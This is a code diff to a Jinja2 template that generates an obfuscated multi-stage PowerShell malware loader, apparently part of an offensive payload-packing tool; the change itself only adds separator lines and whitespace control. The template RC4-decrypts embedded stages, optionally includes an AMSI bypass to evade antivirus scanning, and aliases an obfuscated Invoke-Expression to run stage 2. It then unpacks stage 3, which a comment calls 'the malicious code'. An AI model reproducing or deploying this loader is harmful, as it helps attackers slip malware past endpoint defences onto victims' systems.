@@ -11,17 +11,22 @@
 {{'Write-Debug "Starting up..."'|debug}}
 {%- include "powershell/rc4.ps1" -%}
 
+{{separator}}
+
 {{'Write-Debug "Key exchange..."'|debug}}
-{% if kex == 'dh' %}
+{%- if kex == 'dh' %}
 {%- include "powershell/dh_kex.ps1" %}
 {% elif kex == 'embedded' %}
 ${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
 {% else %}
 ${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes(${{symbol_name("global_key")}});
-{% endif %}
+{% endif -%}
+
+{{separator}}
 
 function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("global_key")}}))};
 
+{{separator}}
 
 {%- from 'macros.jinja2' import obfuscate with context -%}
 
@@ -34,6 +39,8 @@ function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetStri
 
 {% if amsibypass %}{% include amsibypass %}{% endif %}
 
+{{separator}}
+
 {#- Next, load stage 2. Stage 2 defines helper functions such as `Unpack`. -#}
 
 {{'Write-Debug "Load 2nd stage..."'|debug}}
@@ -41,9 +48,12 @@ function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetStri
 s`Al {{symbol_name("InvokeExpressionAlias")}} {{obfuscate("Invoke-Expression")}};
 {{symbol_name("Decrypt-String")}} "{{stage2}}" | {{symbol_name("InvokeExpressionAlias")}};
 
+{{separator}}
+
 {# Finally, execute stage 3; i.e. the malicious code. -#}
 
 {%- for code in stage3 -%}
 {{'Write-Debug "Load 3rd stage..."'|debug}}
 {{symbol_name("Unpack")}} "{{code}}";
+{{separator}}
 {%- endfor -%}
